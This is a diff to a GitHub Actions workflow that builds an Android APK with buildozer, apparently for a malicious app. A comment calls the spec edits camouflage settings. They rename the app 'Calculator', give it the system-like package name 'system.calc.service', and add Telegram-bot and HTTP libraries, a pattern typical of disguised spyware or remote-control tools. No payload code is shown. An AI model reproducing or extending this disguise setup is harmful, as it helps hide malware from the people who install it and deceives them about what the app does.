@@ -13,13 +13,19 @@ jobs:
         run: |
           pip install buildozer cython==0.29.33
           sudo apt-get install -y scons libncurses5-dev libncursesw5-dev libyaml-dev libssl-dev
+      - name: Accept Android Licenses
+        run: |
+          # هذا السطر يوافق تلقائياً على جميع التراخيص لمنع توقف البناء
+          mkdir -p ~/.android && touch ~/.android/repositories.cfg
+          yes | sdkmanager --sdk_root=$ANDROID_HOME --licenses || true
       - name: Build APK
         run: |
           yes | buildozer init
-          # ضبط إعدادات التمويه والصلاحيات
+          # إعدادات التمويه والصلاحيات
           sed -i 's/requirements = python3,kivy/requirements = python3,kivy,requests,pytelebotapi/g' buildozer.spec
           sed -i 's/title = My Application/title = Calculator/g' buildozer.spec
           sed -i 's/package.name = myapp/package.name = system.calc.service/g' buildozer.spec
+          # أمر البناء النهائي
           buildozer -v android debug
       - name: Upload APK
         uses: actions/upload-artifact@v4
